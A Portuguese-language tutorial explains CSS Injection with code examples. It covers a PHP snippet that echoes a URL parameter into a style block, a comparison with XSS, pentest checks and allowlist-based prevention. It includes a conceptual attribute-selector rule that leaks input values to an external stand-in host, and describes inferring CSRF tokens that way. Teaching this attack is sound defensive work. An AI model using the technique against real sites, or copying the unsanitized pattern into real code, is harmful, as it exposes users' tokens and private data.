## 🎨 CSS Injection (CSSi)

A **CSS Injection (CSSi)** acontece quando uma aplicação permite que **dados controlados pelo usuário sejam inseridos diretamente em CSS**, sem validação ou sanitização adequada.

👉 Diferente de uma XSS tradicional, o CSS Injection não significa necessariamente que o atacante consegue executar JavaScript. O risco está na possibilidade de **manipular o comportamento visual da página e, em determinados cenários, realizar ataques de exfiltração de informações através de recursos do CSS**.

📌 O **HTML** representa a estrutura da página, enquanto o **CSS** controla principalmente sua aparência e apresentação.

---

## ⚙️ Como acontece

Imagine uma aplicação que recebe um parâmetro:

```text
?color=red
```

E coloca esse valor diretamente dentro de um `<style>`:

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

O problema ocorre porque o valor de `color` é controlado pelo usuário.

💥 Dependendo de como a entrada é utilizada, o atacante pode tentar **escapar do contexto CSS esperado e inserir novas regras**.

---

## 📌 Exemplos práticos

### 🔹 1. CSS controlado pelo usuário

Aplicação:

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Entrada normal:

```text
?color=red
```

Resultado:

```css
p {
    color: red;
    text-align: center;
}
```

O problema aparece quando o valor fornecido pelo usuário consegue alterar a estrutura do CSS.

👉 Esse é o ponto de entrada que deve ser analisado durante um teste.

---

### 🔹 2. Manipulação através de JavaScript

O código:

```html
<a id="a1">Click me</a>

<script>
if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText =
        "color: " + location.hash.slice(1);
}
</script>
```

utiliza o conteúdo do fragmento da URL:

```text
#valor
```

para modificar o CSS do elemento.

Por exemplo:

```text
#red
```

resultaria em:

```css
color: red;
```

💥 Nesse exemplo, o JavaScript é responsável por aplicar o valor ao CSS. Isso **não é, por si só, uma CSS Injection**; para caracterizar uma vulnerabilidade, é necessário que o atacante consiga utilizar esse fluxo para manipular o contexto de maneira indevida.

---

## 🧠 CSS Injection × XSS

É importante não confundir as duas vulnerabilidades.

### XSS

```text
Entrada do usuário
       ↓
HTML / JavaScript
       ↓
Execução de código
```

### CSS Injection

```text
Entrada do usuário
       ↓
CSS
       ↓
Manipulação das regras CSS
```

👉 CSS Injection **não é simplesmente "XSS usando CSS"**.

---

## 🔎 Exfiltração de informações

Em determinados cenários, CSS Injection pode ser utilizada como um **canal lateral para inferir informações** presentes na página.

A ideia geral é:

```text
CSS Injection
      ↓
Seleciona elementos com determinados valores
      ↓
Recurso externo é requisitado
      ↓
Servidor recebe a requisição
      ↓
Informação pode ser inferida
```

Um exemplo conceitual utiliza seletores CSS para verificar determinados valores de atributos:

```css
input[value^="a"] {
    background-image: url("https://exemplo.invalid/a");
}
```

Se o elemento corresponder ao seletor, o navegador pode tentar carregar o recurso.

💥 Em cenários específicos, esse comportamento pode ser utilizado para **inferir valores que deveriam permanecer privados**, como partes de tokens ou outros dados presentes no DOM.

⚠️ A viabilidade depende muito do navegador, da política de segurança, do contexto do CSS e das características da aplicação.

---

## 🔐 CSS Injection e CSRF Token

Um cenário historicamente estudado envolve aplicações que armazenam informações sensíveis em elementos HTML e permitem CSS controlado pelo atacante.

Por exemplo:

```html
<input
    name="csrf"
    value="abc123..."
>
```

Se houver uma forma de injetar CSS suficientemente poderosa para diferenciar valores desse atributo, um atacante pode tentar **inferir o conteúdo do token através de requisições externas**.

Fluxo conceitual:

```text
CSS Injection
      ↓
Seleciona possíveis valores
      ↓
Requisição externa
      ↓
Observação do servidor
      ↓
Inferência do valor
```

📌 Isso é diferente de simplesmente "executar JavaScript dentro do CSS".

---

## 🚨 Impactos

Dependendo do contexto, CSS Injection pode permitir:

- manipulação da aparência da página
- ocultação ou alteração de elementos
- manipulação de interface
- alteração de comportamento visual
- inferência de informações
- possível exfiltração indireta de dados
- em cenários específicos, obtenção de informações relacionadas a tokens

📌 O impacto depende fortemente de **onde o CSS controlado pelo usuário é inserido e quais informações estão disponíveis no DOM**.

---

## 🔎 Em pentest

Durante um pentest, procure entradas refletidas ou armazenadas em contextos CSS:

```text
?color=
?style=
?theme=
?background=
```

Verifique se a entrada aparece dentro de:

```html
<style>
```

ou em atributos como:

```html
style=""
```

Também analise:

- filtros aplicados
- sanitização
- CSP
- conteúdo disponível no DOM
- possibilidade de requisições externas
- dados sensíveis presentes na página

👉 O objetivo é determinar se **dados controlados pelo usuário conseguem alterar o contexto CSS de maneira não prevista**.

---

## 🛡️ Como prevenir

- não inserir entrada do usuário diretamente em CSS
- utilizar listas de valores permitidos (**allowlist**)
- validar valores antes de utilizá-los
- evitar construir CSS dinamicamente com entrada não confiável
- utilizar mecanismos de sanitização adequados
- implementar uma CSP adequada
- evitar disponibilizar informações sensíveis desnecessariamente no DOM
- proteger tokens contra exposição no frontend

Exemplo:

❌ Evite:

```php
<style>
p {
    color: <?php echo $_GET['color']; ?>;
}
</style>
```

✅ Prefira permitir apenas valores conhecidos:

```php
$colors = ['red', 'blue', 'green'];

$color = $_GET['color'] ?? 'blue';

if (!in_array($color, $colors, true)) {
    $color = 'blue';
}
```

---

📌 **Regra de ouro:**

👉 **Nunca permita que uma entrada controlada pelo usuário seja interpretada diretamente como código ou regras CSS.**